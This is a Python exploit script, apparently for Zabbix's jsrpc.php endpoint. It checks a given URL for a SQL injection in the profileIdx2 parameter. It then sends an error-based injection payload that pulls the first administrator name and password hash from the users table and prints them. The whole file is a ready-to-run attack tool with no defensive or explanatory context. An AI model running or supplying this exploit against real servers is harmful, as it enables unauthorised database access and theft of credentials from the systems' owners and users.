#!/usr/bin/dev python
# -*- coding:utf-8 -*-
# author: Lion Ei'Jonson
# date:2017/9/21

import urllib.request
import sys
import re

def usage():
    print("[*]Useage: python %s http://www.lioneijonson.cn" % sys.argv[0])

def check_sql(url):
    payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    url = url + payload
    try:
        response = urllib.request.urlopen(url).read()
        response = response.decode('utf-8')
        print("[*]Target is available")
    except:
        print("[!]Target is not available")
        sys.exit()
    match = re.compile(r"INSERT\s*INTO\s*profiles")
    if match.findall(response):
        print("[*]Target is vulnerable")
        return True
    else:
        print("[!]Target is not vulnerable")
        sys.exit()

def get_result(url):
    sql_injection = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x2c,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    payload = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib.parse.quote(sql_injection) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib.request.urlopen(payload).read()
        response = response.decode('utf-8')
    except:
        print("[!]Can't inject account and password")
    match = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
    result = match.findall(response)
    if result:
        return result[0]

if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
        sys.exit()
    if(sys.argv[1][:4]) != "http":
        url = "http://" + sys.argv[1]
    else:
        url =sys.argv[1]
    if check_sql(url):
        print(u'账号密码：%s' % get_result(url))